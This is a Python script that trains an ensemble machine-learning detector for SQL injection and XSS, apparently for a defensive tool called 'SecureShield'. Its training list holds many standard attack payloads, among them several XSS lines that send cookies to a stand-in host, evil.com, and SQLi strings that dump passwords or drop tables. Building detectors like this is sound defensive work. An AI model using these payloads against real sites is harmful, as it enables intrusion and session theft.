"""Train an ensemble ML model on SQLi/XSS data."""
import joblib
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.ensemble import RandomForestClassifier, VotingClassifier
from sklearn.linear_model import LogisticRegression
from sklearn.svm import LinearSVC
from sklearn.naive_bayes import MultinomialNB
from sklearn.calibration import CalibratedClassifierCV
from sklearn.model_selection import train_test_split, cross_val_score
from sklearn.metrics import classification_report, confusion_matrix
import numpy as np

import config


# Sample training data
MALICIOUS = [
    # SQLi payloads
    "' OR 1=1 --", "' OR '1'='1", "admin'--", "admin' #", "' OR 1=1#",
    "1' OR '1' = '1", "UNION SELECT * FROM users",
    "UNION SELECT username, password FROM users",
    "1; DROP TABLE users", "1; DROP TABLE users--",
    "SELECT * FROM information_schema.tables",
    "1' UNION SELECT NULL, username, password FROM users--",
    "1' AND SLEEP(5)--", "1' AND BENCHMARK(1000000,MD5('A'))--",
    "'; EXEC xp_cmdshell('dir');--", "1' OR 1=1 LIMIT 1--",
    "' UNION ALL SELECT NULL,NULL,NULL--",
    "admin' OR '1'='1' /*", "1 OR 1=1", "' OR 'x'='x",
    "1) OR (1=1", "1' WAITFOR DELAY '0:0:5'--",
    "' UNION SELECT @@version--",
    "1' AND 1=CONVERT(int,(SELECT @@version))--",
    "'; INSERT INTO users VALUES('h','h')--",
    "' OR EXISTS(SELECT * FROM users)--",
    "1' OR SLEEP(5)#", "' AND 1=0 UNION SELECT password FROM users--",
    "1; SELECT * FROM users WHERE 1=1",
    "' GROUP BY columnnames having 1=1 --",

    # XSS payloads
    "<script>alert(1)</script>", "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>", "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert(1)>", "<svg/onload=alert(1)>",
    "javascript:alert(1)", "javascript:alert(document.cookie)",
    "<iframe src=javascript:alert(1)>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<body onload=alert(1)>", "<input onfocus=alert(1) autofocus>",
    "<a href='javascript:alert(1)'>click</a>",
    "\"><script>alert(String.fromCharCode(88,83,83))</script>",
    "<script>document.location='http://evil.com'</script>",
    "<script>window.location='http://evil.com?c='+document.cookie</script>",
    "<img src=x onerror=\"fetch('http://evil.com?c='+document.cookie)\">",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<ScRiPt>alert(1)</sCrIpT>",
    "<embed src=javascript:alert(1)>",
    "<object data=javascript:alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<video src=x onerror=alert(1)>",
    "';alert(String.fromCharCode(88,83,83))//",
    "<img src=\"x\" onerror=\"alert('XSS')\">",
    "<body onpageshow=alert(1)>",
    "<form action=javascript:alert(1)>",
    "<isindex action=javascript:alert(1) type=image>",
]

BENIGN = [
    "hello world", "user@example.com", "John Smith",
    "Product ID 12345", "search query about cats",
    "/api/users/profile", "page=1&limit=10",
    "username=alice&password=securepass123",
    "product description goes here", "Order #45821 confirmed",
    "Read terms and conditions", "Navigate to dashboard",
    "Image upload completed", "Profile updated successfully",
    "lorem ipsum dolor sit amet", "Click here for more info",
    "Phone: 555-1234", "Date: 2024-01-15",
    "color=blue&size=large", "name=John&email=john@test.com",
    "category=electronics", "sort=price_asc",
    "Total amount: $123.45", "Welcome back, user!",
    "Your order has been shipped", "Subscribe to our newsletter",
    "Forgot password?", "Sign in with Google",
    "Search results for: laptop", "Filter by: price low to high",
    "Add to cart", "Checkout process started",
    "Payment successful", "Thank you for your purchase",
    "View order history", "Edit profile information",
    "Change password", "Enable two-factor authentication",
    "Notification preferences", "Privacy policy",
    "Contact support team", "Live chat available 24/7",
    "FAQ section", "About us page",
    "Career opportunities", "Press releases",
    "Blog post: 10 tips for productivity",
    "Tutorial: Getting started", "Documentation index",
    "Hello, my name is Sarah", "I would like to order pizza",
    "What's the weather today?", "Calculate total: 5 + 3 = 8",
    "Meeting scheduled for tomorrow", "Reset your password link",
    "Verification code sent",
]


def build_ensemble():
    """Build a weighted soft-voting ensemble."""
    rf = RandomForestClassifier(
        n_estimators=100, random_state=42, n_jobs=-1
    )
    # LinearSVC doesn't have predict_proba - wrap with calibration
    svm = CalibratedClassifierCV(
        LinearSVC(random_state=42, max_iter=2000), cv=3
    )
    lr = LogisticRegression(
        max_iter=1000, random_state=42, n_jobs=-1
    )
    nb = MultinomialNB()

    ensemble = VotingClassifier(
        estimators=[
            ('rf', rf),
            ('svm', svm),
            ('lr', lr),
            ('nb', nb),
        ],
        voting='soft',
        weights=[2, 2, 1, 1],
        n_jobs=-1
    )
    return ensemble


def train():
    print("=" * 60)
    print("  SecureShield ML Training - Ensemble Mode")
    print("=" * 60)

    print("\n[*] Preparing training data...")
    X = MALICIOUS + BENIGN
    y = [1] * len(MALICIOUS) + [0] * len(BENIGN)
    print(f"    Total samples: {len(X)}")
    print(f"    Malicious: {len(MALICIOUS)}")
    print(f"    Benign:    {len(BENIGN)}")

    X_train, X_test, y_train, y_test = train_test_split(
        X, y, test_size=0.2, random_state=42, stratify=y
    )

    print("\n[*] Building TF-IDF vectorizer (char n-grams 1-4)...")
    vectorizer = TfidfVectorizer(
        analyzer='char_wb',
        ngram_range=(1, 4),
        max_features=5000,
        lowercase=True,
        sublinear_tf=True
    )
    X_train_vec = vectorizer.fit_transform(X_train)
    X_test_vec = vectorizer.transform(X_test)
    print(f"    Feature dimensions: {X_train_vec.shape[1]}")

    print("\n[*] Training ensemble of 4 models...")
    print("    - Random Forest    (weight 2)")
    print("    - Linear SVM       (weight 2)")
    print("    - Logistic Reg     (weight 1)")
    print("    - Naive Bayes      (weight 1)")

    model = build_ensemble()
    model.fit(X_train_vec, y_train)

    print("\n[*] Cross-validation (5-fold on training set):")
    cv_scores = cross_val_score(model, X_train_vec, y_train, cv=5, n_jobs=-1)
    print(f"    Accuracy: {cv_scores.mean():.4f} (+/- {cv_scores.std():.4f})")

    print("\n[*] Test set evaluation:")
    y_pred = model.predict(X_test_vec)
    print(classification_report(
        y_test, y_pred, target_names=["benign", "malicious"]
    ))

    print("[*] Confusion matrix:")
    cm = confusion_matrix(y_test, y_pred)
    print(f"                 Predicted")
    print(f"                 Benign  Malicious")
    print(f"  Actual Benign     {cm[0][0]:3d}      {cm[0][1]:3d}")
    print(f"  Actual Malicious  {cm[1][0]:3d}      {cm[1][1]:3d}")

    print("\n[*] Saving model artifacts...")
    config.MODELS_DIR.mkdir(exist_ok=True)
    joblib.dump(model, config.MODEL_PATH)
    joblib.dump(vectorizer, config.VECTORIZER_PATH)
    print(f"[✓] Ensemble model saved to: {config.MODEL_PATH}")
    print(f"[✓] Vectorizer saved to:     {config.VECTORIZER_PATH}")
    print("=" * 60)


if __name__ == "__main__":
    train()
